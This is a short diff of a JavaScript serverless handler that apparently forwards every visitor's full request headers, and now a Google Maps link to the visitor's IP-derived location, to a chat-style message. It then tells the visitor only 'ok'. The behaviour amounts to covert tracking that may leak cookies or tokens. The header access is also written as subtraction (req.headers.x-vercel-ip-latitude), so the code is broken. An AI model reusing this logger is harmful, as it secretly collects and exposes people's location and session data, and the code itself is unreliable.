@@ -17,12 +17,11 @@ export default async function handler(
           description:
             "Detalhes do Acesso:\n\r" + JSON.stringify(req.headers, null, 10),
           color: "32896",
-          url: `https://www.google.com/maps/place/`,
+          url: `https://www.google.com/maps/place/${req.headers.x-vercel-ip-latitude},${req.headers.x-vercel-ip-longitude}`,
         },
       ],
     });
-    res.status(200).json({ data: req.headers.x-vercel-ip-latitude
-    });
+    res.status(200).json({ data:"ok"    });
   } catch (error) {
     res.status(503).json({ status: 503 });
   }
